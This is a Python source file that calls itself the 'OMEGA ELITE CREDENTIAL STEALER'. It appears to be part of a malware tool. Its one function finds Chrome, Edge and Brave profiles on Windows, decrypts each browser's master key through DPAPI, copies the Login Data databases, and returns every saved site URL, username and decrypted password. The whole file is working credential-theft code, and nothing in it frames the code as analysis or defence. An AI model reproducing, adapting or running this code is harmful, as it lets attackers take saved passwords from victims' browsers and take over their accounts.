import os, json, base64, sqlite3, shutil, subprocess
from datetime import datetime, timedelta

def get_browser_creds():
    """
    Extracts saved passwords from Chromium-based browsers (Chrome, Edge).
    Returns a formatted string of results.
    """
    import ctypes
    from ctypes import wintypes

    # Decryption helpers
    def decrypt_key(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            
            # Use DPAPI to decrypt the key
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

            def _unprotect(data):
                in_blob = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte)))
                out_blob = DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
                    res = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                    return res
                return None

            return _unprotect(encrypted_key)
        except: return None

    def decrypt_password(buff, key):
        try:
            try:
                from Crypto.Cipher import AES
            except ImportError:
                from Cryptodome.Cipher import AES
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode() # remove suffix and decode
            return decrypted_pass
        except: return "(Decryption Failed)"

    results = ["--- OMEGA ELITE CREDENTIAL STEALER ---"]
    
    paths = {
        "Google Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Microsoft Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
    }

    for browser, path in paths.items():
        if not os.path.exists(path): continue
        results.append(f"\n[B] Browser: {browser}")
        
        key = decrypt_key(path + r"\Local State")
        if not key:
            results.append("  (!) Failed to decrypt master key.")
            continue

        # Look for Login Data in Default or Profiles
        db_locations = [path + r"\Default\Login Data"]
        for i in range(1, 10):
            db_locations.append(path + f"\\Profile {i}\\Login Data")

        for db_path in db_locations:
            if not os.path.exists(db_path): continue
            
            temp_db = os.path.join(os.environ["TEMP"], "creds.db")
            try:
                shutil.copy2(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                rows = cursor.fetchall()
                if rows:
                    results.append(f"  [+] Found profile: {os.path.basename(os.path.dirname(db_path))}")
                    for url, user, pwd_encrypted in rows:
                        if not user: continue
                        pwd = decrypt_password(pwd_encrypted, key)
                        results.append(f"      URL: {url}\n      U: {user}\n      P: {pwd}\n")
                
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                results.append(f"  (!) Error reading {db_path}: {e}")

    if len(results) <= 2:
        return "No credentials found or browsers closed."
    return "\n".join(results)
